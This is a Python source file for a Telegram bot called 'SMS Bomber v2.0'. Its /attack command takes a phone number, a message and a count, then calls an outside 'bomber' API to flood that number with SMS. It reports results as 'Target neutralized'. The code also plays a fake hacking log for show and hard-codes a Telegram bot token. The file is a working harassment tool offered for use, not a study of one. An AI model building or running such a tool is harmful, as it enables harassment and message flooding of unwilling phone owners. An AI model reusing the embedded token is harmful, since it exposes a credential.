import requests
import os
import sys
import time
import random
import telebot

# ============ CONFIG ============
API_URL = "https://anishexploits.com/bomber/custom-sms.php"
OWNER   = "SUMIT"
TELEGRAM_BOT_TOKEN = "8958289792:AAEl79ui_MvWzwFZZp1v9O8IhdaPV_1lgNQ" # Yahan apna bot token dalein

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ============ UTILS ============
def fake_hack_sequence():
    logs = [
        "Bypassing firewall...",
        "Injecting payload...",
        "Connecting to server...",
        "Decrypting API key...",
        "Verifying credentials...",
        "Escalating privileges...",
        "Establishing secure tunnel...",
        "Spoofing MAC address...",
        "Routing through 7 proxies...",
        "Access granted ✔",
    ]
    for log in logs:
        time.sleep(0.2)

# ============ TELEGRAM HANDLERS ============

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        f"⚡ *THE SMS BOMBER v2.0* ⚡\n"
        f"Powered by @{OWNER}\n\n"
        f"Welcome, {message.from_user.first_name}!\n"
        f"Use /attack <phone> <message> <count> to launch an attack.\n"
        f"Example: `/attack 9876543210 Hello 5`\n\n"
        f"Other commands:\n"
        f"/status - Check API Status\n"
        f"/about - About Developer"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['about'])
def send_about(message):
    about_text = (
        f"👤 *Name*: {OWNER}\n"
        f"💻 *Role*: Ethical Hacker\n"
        f"🛠 *Tool*: SMS Bomber v2.0\n"
        f"⚡ *Status*: ONLINE\n"
        f"🔥 *Motto*: Hack the world, ethically."
    )
    bot.reply_to(message, about_text, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_key(message):
    bot.reply_to(message, "⏳ Checking API status...")
    try:
        r = requests.get(API_URL, params={
            "phone": "9999999999",
            "sms":   "ping",
            "count": "1"
        }, timeout=20)
        data = r.json()

        if r.status_code == 200 and data.get("status") == "success":
            status_text = (
                f"✔ *API*: ONLINE\n"
                f"✔ *Endpoint*: `{API_URL}`\n"
                f"✔ *Brand*: {data.get('brand', 'N/A')}\n"
                f"✔ *Version*: {data.get('version', 'N/A')}"
            )
        else:
            status_text = f"⚠ API responded but not OK: {data.get('message', data)}"
    except Exception as e:
        status_text = f"❌ API check failed: {e}"
    
    bot.reply_to(message, status_text, parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        parts = message.text.split(maxsplit=3)
        if len(parts) < 4:
            bot.reply_to(message, "❌ *Invalid format!*\nUse: `/attack <phone> <message> <count>`", parse_mode="Markdown")
            return

        phone = parts[1]
        sms = parts[2]
        count_in = parts[3]

        if not phone.isdigit() or len(phone) < 10:
            bot.reply_to(message, "❌ Invalid number! Only digits, min 10.")
            return

        count = int(count_in) if count_in.isdigit() and int(count_in) > 0 else 1

        bot.reply_to(message, f"⚡ Launching attack on {phone}...")
        fake_hack_sequence()

        params = {"phone": phone, "sms": sms, "count": count}
        r = requests.get(API_URL, params=params, timeout=60)
        data = r.json()

        if data.get("status") == "success":
            res = data.get("result", {})
            sent    = res.get("sent", 0)
            failed  = res.get("failed", 0)
            time_ms = res.get("time_ms", 0)
            speed   = res.get("speed", "N/A")

            result_text = (
                f"✔ *ATTACK SUCCESSFUL*\n\n"
                f"📤 Sent      : {sent}\n"
                f"❌ Failed    : {failed}\n"
                f"⏱  Time      : {time_ms} ms\n"
                f"⚡ Speed     : {speed}\n"
                f"🏷  Brand     : {data.get('brand', 'N/A')}\n\n"
                f"Target neutralized. Good job, {OWNER}!"
            )
            bot.reply_to(message, result_text, parse_mode="Markdown")
        else:
            msg = data.get("message", str(data))
            code = data.get("code", "?")
            bot.reply_to(message, f"❌ Failed ({code}): {msg}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# ============ MAIN ============
if __name__ == "__main__":
    print(f"[*] Telegram Bot started as {OWNER}...")
    bot.infinity_polling()
